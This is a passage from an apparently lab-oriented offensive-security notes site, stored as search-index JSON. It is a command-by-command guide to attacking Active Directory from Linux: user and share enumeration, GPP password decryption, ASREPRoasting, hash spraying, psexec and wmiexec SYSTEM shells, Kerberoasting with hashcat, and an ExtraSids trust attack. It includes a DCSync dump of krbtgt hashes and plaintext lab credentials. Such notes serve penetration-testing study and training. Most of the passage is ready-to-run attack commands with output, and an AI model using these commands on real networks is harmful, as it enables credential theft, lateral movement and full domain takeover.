from Linux","text":"<p>Index of Active Directory</p> <p>Attacking from linux</p> <ul> <li>Enumerating Active Directory from Linux</li> <li>Attacking Active Directory from Linux</li> <li>Lateral Movement in Active Directory from Linux</li> <li>Privileges escalation in Active Directory from Linux</li> </ul> <p>Attacking from Windows</p> <ul> <li>Enumerating Active Directory from Windows</li> <li>Attacking Active Directory from Windows</li> <li>Privileges escalation in Active Directory from Windows</li> </ul>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#1hosts","title":"1.Hosts","text":"<p>We can use:</p> <ul> <li>wireshark</li> </ul> <pre><code>sudo -E wireshark\n</code></pre> <ul> <li>tcpdump</li> </ul> <pre><code>sudo tcpdump -i ens224 \n</code></pre> <ul> <li>net-creds</li> <li>NetMiner</li> <li>pktmon.exe: monitoring tool built-in, which was added to all editions of Windows 10.</li> <li>responder in analyzing mode:</li> </ul> <p>Responder\u00a0is a tool built to listen, analyze, and poison\u00a0<code>LLMNR</code>,\u00a0<code>NBT-NS</code>, and\u00a0<code>MDNS</code>\u00a0requests and responses. It has many more functions, but for now, all we are utilizing is the tool in its Analyze mode. This will passively listen to the network and not send any poisoned packets. We'll cover this tool more in-depth in later sections.</p> <pre><code>sudo responder -I ens224 -A \n</code></pre> <ul> <li>Fping\u00a0provides us with a similar capability as the standard ping application in that it utilizes ICMP requests and replies to reach out and interact with a host.</li> </ul> <pre><code>fping -a -g -s -q $ipRange\nfping -agsq $ipRange\n# -a: forces the tool to show only alive hosts.\n# -g: tells the tool we want to perform a ping sweep instead of a standard ping.\n# -s: prints stats at the end of the scan\n# -q: not to show per-target results\n</code></pre> <ul> <li>Classic ping:</li> </ul> <pre><code>for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep \"bytes from\" &amp;) ;done\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#2-users","title":"2. Users","text":"","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#kerbrute","title":"Kerbrute","text":"<p>See kerbrute.</p> <p>It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. \u00a0This method does not generate Windows event ID\u00a04625: An account failed to log on, or a logon failure which is often monitored for.</p> <p>How it works?</p> <p>Basically, the tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error\u00a0<code>PRINCIPAL UNKNOWN</code>, the username is invalid. Whenever the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists, and the tool will mark it as valid.</p> <p>This method of username enumeration does not cause logon failures and will not lock out accounts.</p> <pre><code>sudo git clone https://github.com/ropnop/kerbrute.git\n\n# Typing make help will show us the compiling options available.\ncd kerbrute\nmake help\n\n# type make all and compile one each for use on Linux, Windows, and Mac systems (an x86 and x64 version for each).\nsudo make all\n\n# The newly created dist directory will contain our compiled binaries.\nls -la dist\n\n# Add the tool to our PATH to make it accessible from anywhere in the host. For that we make sure first of the PATH\necho $PATH\n\n# and then we move the binary to a path, for instance\nsudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute\n</code></pre> <pre><code>kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users\n# d: domain\n# --dc: domain controller\n# -o: output file\n</code></pre> <p>However, using Kerbrute for username enumeration will generate event ID\u00a04768: A Kerberos authentication ticket (TGT) was requested.  Defenders can tune their SIEM tools to look for an influx of this event ID.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#crackmapexec","title":"crackmapexec","text":"<p>CrackMapExec:</p> <pre><code># This is a useful tool that will also show the badpwdcount\ncrackmapexec smb $ip --users\n\n# Also, if we have valid credentials, we could extract the users with the flag --users\nsudo crackmapexec smb $ip -u $username -p $password --users\n</code></pre> <p>As a matter of fact, if we have a foothold on the domain, we could perform the following enumeration:</p> <pre><code># Check if we can access a machine\ncrackmapexec smb $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt;\n\n# Using a hash instead of a password, to authenticate ourselves: Pass the hash attack (PtH)\ncrackmapexec smb $ip -u &lt;username&gt; -H &lt;hash&gt; -d &lt;DOMAIN&gt;\n\n# Enumerate active sessions\ncrackmapexec smb $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --sessions\n\n\n# Get sam: extract hashes from all users authenticated in the machine \ncrackmapexec smb $ip -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --sam\n\n# Get the ntds.dit, given that your user has permissions\ncrackmapexec smb $ip -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --ntds\n\n# Check which machines we can access in a subnet\ncrackmapexec smb $ip/24 -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt;\n\n# Enumerate logged on users in other hosts of the domain\ncrackmapexec smb $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --loggedon-users\n\n# Enumerate users of the domain\nsudo crackmapexec smb  $ip -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --users\n\ncrackmapexec smb $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --users\n\n# Enumerate groups of the domain\ncrackmapexec smb $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --groups\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#rpcclient","title":"rpcclient","text":"<p>rpcclient and the \u00a0SMB NULL session technique:</p> <pre><code># Connect to a remote shared folder (same as smbclient in this regard)\nrpcclient -U \"\" -N $ip\n\n# Enumerate all domains that are deployed in the network \nenumdomains\n\n# Provides domain, server, and user information of deployed domains.\nquerydominfo\n\n# Enumerates all domain users.\nenumdomusers\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#enum4linux","title":"enum4linux","text":"<p>enum4linux </p> <pre><code># Enumerate users\nenum4linux -U $ip  | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"]\"\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#ldap","title":"ldap","text":"<p>LDAP anonymous binds allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#ldapsearch","title":"ldapsearch","text":"<pre><code>ldapsearch -h $ip -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"(&amp;(objectclass=user))\"  | grep sAMAccountName: | cut -f2 -d\" \"\n</code></pre> <p>Other tools related to ldap: <code>windapsearch.py</code>,\u00a0<code>ldapsearch</code>,\u00a0<code>ad-ldapdomaindump.py</code>.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#windapsearch","title":"windapsearch","text":"<p>See more at windapsearch.</p> <pre><code># Enumerate Users\n./windapsearch.py -d $domain -u $username\\\\ldapbind -p $password -U\n# -U: returns only USERS\n# -u: specifies username. \"\" for blank\n# -p: indicates password\n# -d: indicates domain\n\n# Enumerate users with no user foothold\n./windapsearch.py --dc-ip $ip -u \"\" -U\n# -u: specifies username. \"\" for blank\n# -U: returns only USERS\n\n# Enumerate Domain Admins\n./windapsearch.py --dc-ip $ip -u $username@$domain -p $password --da\n./windapsearch.py -d $domain -u $username\\\\ldapbind -p $password --da\n# --da: returns only Domain admins\n# -u: specifies username. \"\" for blank\n# -p: indicates password\n# -d: indicates domain\n# Example:\n# python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da\n\n# Enumerating Computers\n./windapsearch.py -d $domain -u $username\\\\ldapbind -p $password -C -r\n# -r or --resolve option: the tool will perform a DNS lookup on every enumerated dNSHostName found and output the computer information, including IP address in CSV format. \n# -C: list all matching entries where objectClass=Computer\n\n# Custom Search \n./windapsearch.py -d $domain -u $username\\\\ldapbind -p $password -s Lalala\n# -s: search everywhere the term, in this case Lalala.\n\n# Enumerate Privilege Users with -PU\npython3 windapsearch.py --dc-ip $ip -u $username@$domain -p $password -PU\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#3-password-policy","title":"3. Password policy","text":"<p>The password policy can also be obtained remotely with:</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#crackmapexec_1","title":"crackmapexec","text":"<p>CrackMapExec:</p> <pre><code># Obtain the password policy\ncrackmapexec smb $ip -u &lt;username&gt; -p &lt;password&gt; --pass-pol\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#rpcclient_1","title":"rpcclient","text":"<p>rpcclient and the \u00a0SMB NULL session technique:</p> <pre><code>rpcclient -U \"\" -N $ip\n\nrpcclient $&gt; querydominfo\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#enum4linux_1","title":"enum4linux","text":"<ul> <li>enum4linux </li> </ul> <pre><code>enum4linux -P $ip\n\nenum4linux -U 172.16.5.5  | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"]\"\n</code></pre> <ul> <li>enum4linux-ng </li> </ul> <pre><code>enum4linux-ng.py -P &lt;target&gt; -oA ilfreight\n\n# Enum4linux-ng provided us with a bit clearer output and handy JSON and YAML output using the -oA flag.\ncat ilfreight.json \n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#net","title":"Net","text":"<p>With net use:</p> <pre><code># Establish a null session from windows\nnet use \\\\DC01\\ipc$ \"\" /u:\"\"\n\n# use a username/password combination to attempt to connect\nnet use \\\\DC01\\ipc$ \"\" /u:guest\nSystem error 1331 has occurred.\n# Error: Account is Disabled\n\nnet use \\\\DC01\\ipc$ \"password\" /u:guest\n# System error 1326 has occurred.\n# The user name or password is incorrect.\n\nnet use \\\\DC01\\ipc$ \"password\" /u:guest\n# System error 1909 has occurred.\n# The referenced account is currently locked out and may not be logged on to.\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#ldap_1","title":"ldap","text":"<p>LDAP anonymous binds allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.</p> <pre><code>ldapsearch -h $ip -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"*\" | grep -m 1 -B 10 pwdHistoryLength\n</code></pre> <p>Other tools related to ldap: <code>windapsearch.py</code>,\u00a0<code>ldapsearch</code>,\u00a0<code>ad-ldapdomaindump.py</code>.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#4-credentials","title":"4. Credentials","text":"","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#credentials-in-smb-shares-and-sysvol-scripts","title":"Credentials in SMB Shares and SYSVOL Scripts","text":"<p>The SYSVOL share can be a treasure trove of data, especially in large organizations. It is recommendable always have to look at it.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#group-policy-preferences-gpp-passwords","title":"Group Policy Preferences (GPP) Passwords","text":"<p>When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:</p> <ul> <li>Map drives (drives.xml)</li> <li>Create local users</li> <li>Create printer config files (printers.xml)</li> <li>Creating and updating services (services.xml)</li> <li>Creating scheduled tasks (scheduledtasks.xml)</li> <li>Changing local admin passwords.</li> </ul> <p>These files can contain an array of configuration data and defined passwords. The\u00a0<code>cpassword</code>\u00a0attribute value is AES-256 bit encrypted, but Microsoft\u00a0published the AES private key on MSDN, which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.</p> <p>This was patched in 2014\u00a0MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.</p> <p>In older Windows environments like Server 2003 and 2008, the XML file stores encrypted AES passwords in the \u201ccpassword\u201d parameter that can get decrypted with Microsoft\u2019s public AES key (link). If you retrieve the cpassword value more manually, the\u00a0<code>gpp-decrypt</code>\u00a0utility can be used to decrypt the password as follows:</p> <pre><code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE\n</code></pre> <p>Locating &amp; Retrieving GPP Passwords with CrackMapExec</p> <pre><code>crackmapexec smb -L | grep gpp\n</code></pre> <p>To access the GPP information and decrypt its stored password using CrackMapExec, we can use 2 modules \u2014\u00a0<code>**gpp_password**</code>\u00a0and\u00a0<code>**gpp_autologin**</code>\u00a0modules. The\u00a0<code>**gpp_password**</code>\u00a0decrypts passwords stored in the Group.xml file, while\u00a0<code>**gpp_autologin**</code>\u00a0retrieves autologin information from the Registry.xml file in the preferences folder.</p> <pre><code>crackmapexec smb $domainControllerIP -u $user -p $password -M gpp_autologin\n# Example:\n# crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin\n</code></pre> <p>Results: <pre><code>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']\n</code></pre></p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#asreproasting","title":"\ud83d\udca1 ASREPRoasting","text":"<p>It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. </p> <p>ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#dont_req_preauth-value-using-kerbrute","title":"DONT_REQ_PREAUTH Value using kerbrute","text":"<pre><code>kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt \n</code></pre> <p>However, this will be as accurate as the user list.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#get-npuserspy-from-the-impacket-toolkit","title":"Get-NPUsers.py from the Impacket toolkit","text":"<pre><code># Retuns all users that with DONT_REQ_PREAUTH amd UF_DONT_REQ_PREAUTH\nGetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile jsmith.txt | grep -v SessionError\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#5-shares","title":"5. Shares","text":"","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#crackmapexec_2","title":"crackmapexec","text":"<p>CrackMapExec:</p> <pre><code># Enumerate shares\ncrackmapexec smb $ip -u &lt;username&gt; -p &lt;password&gt; --shares\n\n# The module spider_plus will dig through each readable share on the host and list all readable files. \nsudo crackmapexec smb  $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; -M spider_plus --share 'NameOfShare'\n# CME writes the results to a JSON file located at /tmp/cme_spider_plus/&lt;ip of host&gt;\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#smbmap","title":"SMBMap","text":"<p>smbmap</p> <pre><code># Enumerate network shares and access associated permissions.\nsmbmap -H $ip\n\n# # Enumerate network shares and access associated permissions with recursivity\nsmbmap -H $ip -r\n# --dir-only: provides only the output of all directories and did not list all files.\n\n# Check access and permissions level for a folder with recursion\nsmbmap -u $username -p $password -d $domain -H $ip -R $nameofFolder --dir-only\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/#rpcclient_2","title":"rpcclient","text":"<p>rpcclient</p> <pre><code># SMB NULL Session with rpcclient\nrpcclient -U \"\" -N $ip\n</code></pre> <pre><code># SMB NULL Session with rpcclient\nrpcclient -U \"\" -N $ip\n\n# Connect to a remote shared folder (same as smbclient in this regard)\nrpcclient -U \"\" 10.129.14.128\nrpcclient -U'%' 10.10.110.17\n\n# Server information\nsrvinfo\n\n# Enumerate all domains that are deployed in the network \nenumdomains\n\n# Provides domain, server, and user information of deployed domains.\nquerydominfo\n\n# Enumerates all available shares.\nnetshareenumall\n\n# Provides information about a specific share.\nnetsharegetinfo &lt;share&gt;\n\n# Get Domain Password Information\ngetdompwinfo\n\n# Enumerates all domain users.\nenumdomusers\n\n# Provides information about a specific user.\nqueryuser &lt;RID&gt;\n    # An example:\n    # rpcclient $&gt; queryuser 0x3e8\n\n# Provides information about a specific group.\nquerygroup &lt;ID&gt;\n\n# Enumerating Privileges\nenumprivs\n\n# Enumerating SID from LSA\nlsaenumsid\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-lateral-movement/","title":"Lateral Movement in Active Directory from Linux","text":"<p>Index of Active Directory</p> <p>Attacking from linux</p> <ul> <li>Enumerating Active Directory from Linux</li> <li>Attacking Active Directory from Linux</li> <li>Lateral Movement in Active Directory from Linux</li> <li>Privileges escalation in Active Directory from Linux</li> </ul> <p>Attacking from Windows</p> <ul> <li>Enumerating Active Directory from Windows</li> <li>Attacking Active Directory from Windows</li> <li>Privileges escalation in Active Directory from Windows</li> </ul>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-lateral-movement/#spraying-password-technique-in-the-domain-with-crackmapexec","title":"Spraying password technique in the domain with crackmapexec","text":"<pre><code># Spraying password with crackmapexec\ncrackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +\n# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list\n# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.\n# -H: hash\n</code></pre> <p>This technique, while effective, is quite noisy and is not a good choice for any assessments that require stealth. </p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-privilege-escalation/","title":"Privileges escalation in Active Directory from Linux","text":"<p>Index of Active Directory</p> <p>Attacking from linux</p> <ul> <li>Enumerating Active Directory from Linux</li> <li>Attacking Active Directory from Linux</li> <li>Lateral Movement in Active Directory from Linux</li> <li>Privileges escalation in Active Directory from Linux</li> </ul> <p>Attacking from Windows</p> <ul> <li>Enumerating Active Directory from Windows</li> <li>Attacking Active Directory from Windows</li> <li>Privileges escalation in Active Directory from Windows</li> </ul> <p>There are several ways to gain SYSTEM-level access on a host, including but not limited to:</p> <ul> <li>Remote Windows exploits such as MS08-067, EternalBlue, or BlueKeep.</li> <li>Abusing a service running in the context of the\u00a0<code>SYSTEM account</code>, or abusing the service account\u00a0<code>SeImpersonate</code>\u00a0privileges using\u00a0Juicy Potato. This type of attack is possible on older Windows OS' but not always possible with Windows Server 2019.</li> <li>Local privilege escalation flaws in Windows operating systems such as the Windows 10 Task Scheduler 0-day.</li> <li>Gaining admin access on a domain-joined host with a local account and using Psexec to launch a SYSTEM cmd window</li> </ul> <p>By gaining SYSTEM-level access on a domain-joined host, you will be able to perform actions such as, but not limited to:</p> <ul> <li>Enumerate the domain using built-in tools or offensive tools such as BloodHound and PowerView.</li> <li>Perform Kerberoasting / ASREPRoasting attacks within the same domain.</li> <li>Run tools such as Inveigh to gather Net-NTLMv2 hashes or perform SMB relay attacks.</li> <li>Perform token impersonation to hijack a privileged domain user account.</li> <li>Carry out ACL attacks.</li> </ul>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-privilege-escalation/#psexecpy","title":"PSExec.py","text":"<p>Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the\u00a0<code>ADMIN$</code>\u00a0share on the target host. It then registers the service via\u00a0<code>RPC</code>\u00a0and the\u00a0<code>Windows Service Control Manager</code>. Once established, communication happens over a named pipe, providing an interactive remote shell as\u00a0<code>SYSTEM</code>\u00a0on the victim host.</p> <pre><code># Get help \nimpacket-psexec -h\n\n# Connect to a remote machine with a local administrator account\npsexec.py $domain/$user:$password@$ip \n\n# Another way\nimpacket-psexec administrator:'&lt;password&gt;'@$ip\n# Examples:\n# psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.130\n# impacket-psexec inlanefreight.local/wley:'transporter@4'@172.16.5.130\n</code></pre> <pre><code># Results\nC:\\Windows\\system32&gt;whoami\nnt authority\\system\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-privilege-escalation/#wmiexecpy","title":"wmiexec.py","text":"<p>Wmiexec.py utilizes a semi-interactive shell where commands are executed through\u00a0Windows Management Instrumentation. It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands).</p> <pre><code># Connect to a remote machine with a local administrator account\nwmiexec.py $domain/$user:$password@$ip \n# Examples:\n# impacket-wmiexec inlanefreight.local/wley:'transporter@4'@172.16.5.5 \n# wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5\n</code></pre> <pre><code># Results\nC:&gt;whoami\ndomain\\user22\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-privilege-escalation/#kerberoasting","title":"\ud83d\udd10  Kerberoasting","text":"<p>See about Kerberos authentication.</p> <p>Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts. </p> <p>Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as\u00a0<code>NT AUTHORITY\\LOCAL SERVICE</code>. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary.</p> <p>Requirements to perform a Kerberoasting attack:</p> <ul> <li>an account's cleartext password (or NTLM hash),</li> <li>a shell in the context of a domain user account or SYSTEM level access on a domain-joined host.</li> </ul> <p>Depending on your position in a network, this attack can be performed in multiple ways:</p> <ul> <li>From a non-domain joined Linux host using valid domain user credentials.</li> <li>From a domain-joined Linux host as root after retrieving the keytab file.</li> <li>From a domain-joined Windows host authenticated as a domain user.</li> <li>From a domain-joined Windows host with a shell in the context of a domain account.</li> <li>As SYSTEM on a domain-joined Windows host.</li> <li>From a non-domain joined Windows host using\u00a0runas\u00a0/netonly.</li> </ul> <p>Several tools can be utilized to perform the attack:</p> <ul> <li>Impacket\u2019s\u00a0GetUserSPNs.py\u00a0from a non-domain joined Linux host.</li> <li>A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.</li> <li>From Windows, utilizing tools such as PowerView,\u00a0Rubeus, and other PowerShell scripts.</li> </ul>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-privilege-escalation/#getuserspnspy","title":"GetUserSPNs.py","text":"<p>More about GetUserSPNs.py.</p> <p>1. Install Impacket from: https://github.com/fortra/impacket</p> <pre><code>git clone https://github.com/fortra/impacket\ncd impacket\nsudo python3 -m pip install .\n</code></pre> <p>2. Gather a listing of SPNs in the domain. We will need a set of valid domain credentials and the IP address of a Domain Controller.</p> <pre><code>GetUserSPNs.py -dc-ip $ip $domain/$username\n# -dc-ip: Domain controller IP.\n# Example:\n# GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend\n</code></pre> <p>3. Requesting all TGS Tickets:</p> <pre><code>GetUserSPNs.py -dc-ip $ip $domain/$username -request \n# Example:\n# GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request \n</code></pre> <p>4. Or request just the TGS ticket for a specific account. </p> <pre><code>GetUserSPNs.py -dc-ip $ip $domain/$username -request-user $userrequested -outputfile file_tgs\n# -outputfile:  to write the TGS tickets to a file \n# Example:\n# GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev\n</code></pre> <p>5. Cracking the Ticket Offline with Hashcat.</p> <pre><code>hashcat -m 13100 file_tgs /usr/share/wordlists/rockyou.txt \n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-privilege-escalation/#targetedkerberoast","title":"targetedKerberoast","text":"<p>targetedKerberoast is a Python script that can, like many others (e.g. GetUserSPNs.py), print \"kerberoast\" hashes for user accounts that have a SPN set. This tool brings the following additional feature: for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), print the \"kerberoast\" hash, and delete the temporary SPN set for that operation. This is called targeted Kerberoasting. This tool can be used against all users of a domain, or supplied in a list, or one user supplied in the CLI.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-privilege-escalation/#attacking-domain-trusts-1-child-parent-trusts","title":"\ud83d\udc40 Attacking Domain Trusts # 1: Child -&gt; Parent Trusts","text":"","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-privilege-escalation/#extrasids-attack","title":"\ud83c\udff0 ExtraSids Attack","text":"<p>Requirements for performing the attack:</p> <ul> <li>The KRBTGT hash for the child domain</li> <li>The SID for the child domain</li> <li>The name of a target user in the child domain (does not need to exist!)</li> <li>The FQDN of the child domain</li> <li>The SID of the Enterprise Admins group of the root domain</li> </ul> <p>We have complete control over the child domain, which would be: LOGISTICS.INLANEFREIGHT.LOCAL.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-privilege-escalation/#step-1-getting-the-krbtgt-hash-for-the-child-domain","title":"Step 1: getting the KRBTGT hash for the child domain","text":"<p>We will perform a DCSync attack with secretsdump.py:</p> <pre><code>secretsdump.py $targetedDomain/$UserWithAdminPriv@$TargetedIP -just-dc-user $NetbiosNameofDomain/krbtgt\n\n# Example:\n# secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt\n# Enter password: HTB_@cademy_stdnt_admin!\n</code></pre> <p>For this we need: - The user (<code>htb-student_adm</code>) must have the necessary privileges to query the domain controller. We need their creds. - We require to know $targetedDomain and NetbiosNameofDomain. - The Impacket library must be installed, and the tool should be executed in an environment with Python support. - Network connectivity to the target IP (in this example <code>172.16.5.240</code>) is required.</p> <p>Results:</p> <pre><code>Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation\n\nPassword:\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::\n[*] Kerberos keys grabbed\nkrbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8\nkrbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e\nkrbtgt:des-cbc-md5:fee04c3d026d7538\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-privilege-escalation/#step-2-getting-the-sid-for-the-child-domain","title":"Step 2: getting the SID for the child domain","text":"<p>Next, we can use\u00a0lookupsid.py\u00a0, an Impacket script used for querying a Windows system to obtain information about the SID associated with a given user or group. </p> <p>The tool will give us back the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format\u00a0<code>DOMAIN_SID-RID</code>.</p> <pre><code>lookupsid.py $targetedDomain/$UserWithAdminPriv@TargetedIP \n# Example:\n# lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \n# Enter password: HTB_@cademy_stdnt_admin!\n</code></pre> <p>If we just want to get the Domain SID, we can filter it out:</p> <pre><code>lookupsid.py $targetedDomain/$UserWithAdminPriv@TargetedIP | grep \"Domain SID\"\n# Example:\n# lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep \"Domain SID\"\n# Enter password: HTB_@cademy_stdnt_admin!\n</code></pre> <p>Results:  S-1-5-21-2806153819-209893948-922872689</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-privilege-escalation/#step-3-getting-the-name-of-a-target-user-in-the-child-domain-does-not-need-to-exist","title":"Step 3: getting the name of a target user in the child domain (does not need to exist!)","text":"<p>For instance, <code>hacker</code>.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-privilege-escalation/#step-4-getting-the-fqdn-of-the-child-domain","title":"Step 4: getting the FQDN of the child domain.","text":"<p>logistics.inlanefreight.local</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-privilege-escalation/#step-5-getting-the-sid-of-the-enterprise-admins-group-of-the-root-domain","title":"Step 5: getting the SID of the Enterprise Admins group of the root domain","text":"<p>Next, we can rerun the command, targeting the INLANEFREIGHT Domain Controller (DC01) at 172.16.5.5. We will perform a SID enumeration on the target system and filter the results to find information related to the Enterprise Admins group in the Active Directory (AD) domain. For filtering we will use the RID of the Enterprise Admins group.\u00a0Here\u00a0is a handy list of well-known SIDs.</p> <pre><code>lookupsid.py $targetedDomain/$UserWithAdminPriv@$DomainControllerIP | grep \"Enterprise Admins\"\n# Example:\n# lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep \"Enterprise Admins\"\n# Enter password: HTB_@cademy_stdnt_admin!\n\n# Way2:\nlookupsid.py LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm@INLANEFREIGHT.LOCAL | grep \"Enterprise Admins\"\n# Enter password: HTB_@cademy_stdnt_admin!\n</code></pre> <p>Result: <pre><code>519: INLANEFREIGHT\\Enterprise Admins 